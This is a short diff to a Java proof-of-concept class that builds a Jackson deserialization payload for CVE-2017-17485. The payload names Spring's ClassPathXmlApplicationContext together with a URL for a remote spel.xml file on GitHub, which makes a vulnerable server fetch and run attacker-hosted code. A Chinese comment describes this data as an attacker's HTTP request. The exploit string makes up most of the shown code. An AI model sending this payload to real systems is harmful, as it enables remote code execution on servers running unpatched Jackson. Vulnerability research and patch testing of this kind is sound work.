@@ -11,10 +11,12 @@ import com.fasterxml.jackson.databind.ObjectMapper;
  *
  */
 public class poc {
-	
 	public static void payload() {
-		// CVE-2017-17485
-		//["org.springframework.context.support.ClassPathXmlApplicationContext", "http://127.0.0.1/spel.xml"]
+		/*
+		 * 假设攻击者的HTTP请求数据
+		 * ["org.springframework.context.support.ClassPathXmlApplicationContext", "http://127.0.0.1/spel.xml"]
+		 * 
+		 */
 		String payload = "[\"org.springframework.context.support.ClassPathXmlApplicationContext\", " +
 	                "\"https://raw.githubusercontent.com/iBearcat/Jackson-CVE-2017-17485/master/spel.xml\"]\n";
 		System.out.println(payload);
